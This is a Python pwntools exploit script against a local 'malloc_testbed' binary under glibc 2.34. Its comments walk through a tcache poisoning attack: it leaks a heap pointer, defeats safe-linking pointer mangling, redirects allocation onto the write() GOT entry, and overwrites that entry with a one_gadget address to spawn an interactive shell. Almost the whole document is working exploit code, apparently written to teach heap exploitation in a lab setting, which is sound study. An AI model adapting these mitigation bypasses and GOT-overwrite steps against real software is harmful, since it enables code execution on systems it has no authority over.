#!/usr/bin/python
'''
Expects glibc 2.34, use ./change_glibc_version.py to set.
'''
from pwn import *
from testbed import *


def tcache_overflow(p):
    libc = get_libc_addr(p)
    malloc(p, b'0x18')
    malloc(p, b'0x18')
    malloc(p, b'0x18')

    '''
    We will free two chunks to bypass a recent glibc mitigation.
    Each tcache bin now tracks how many free chunks it has, so we
    need two chunks to be free in the 0x20 bin for us to link in our
    fake chunk after index 1.
    We'll free index 1 second, as the tcache is LIFO. This will set up
    our overflow from index 0 to index 1.
    '''
    free(p, b'2')
    free(p, b'1') 

    '''
    Before we do our overflow, we need a heap leak. This is due to another
    recent mitigation that 'encrypts' tcache entries. Thankfully this is
    easy to bypass if you have a leak. We'll simulate a UAF for this.
    '''
    read_chunk(p, b'1') # Index 1 should have mangled pointer to index 2
    data = p.recvline()
    try:
        heap_leak = u64(data[0:8])
    except struct.error:
        print("Unexpected alignment!")
        print("Probably newline or something in the leak...")
        print(f"Raw Leak: {data}")
        exit(1)

    heap_leak = heap_leak >> 8 # Not sure where 0x20 at end is coming from... remove.
    print(f'encrypted leak: {hex(heap_leak)}')

    # Mitigation bypass step 1
    heap_leak = decrypt_tcache(heap_leak)

    # Now we have our leak, we can use it to encrypt our target
    write_got = 0x603030  # This is our target thanks to partial relro
    # We chose the target above as the final nibble is 0 (another mitigation bypass)
    encrypted_tgt = write_got ^ (heap_leak >> 12)  # Step 2 to mitigation bypass

    # Overwrite the fd ptr of first chunk in 0x20 tcache
    edit(p, b'0', p64(0)*3 + p64(0x21) + p64(encrypted_tgt))

    malloc(p, b'0x18')
    malloc(p, b'0x18')  # Now we have access to the target like it's a typical chunk

    one_gadget = libc.address + 0xf1a96
    '''
    Constraints:
    [rsp+0x70] == NULL
    [[rsp+0x170]] == NULL || [rsp+0x170] == NULL
    [rsp+0x30] == NULL || (s32)[rsp+0x30]+0x4 <= 0 
    '''
   
    edit(p, b'4', p64(one_gadget))
    read_chunk(p, b'0')


# Running exploit in debugger in case you are on kernel >= 6.4... CET is an issue.
p = gdb.debug('./malloc_testbed', '''
c            
''')

#p = process('./malloc_testbed')

tcache_overflow(p)

p.interactive()
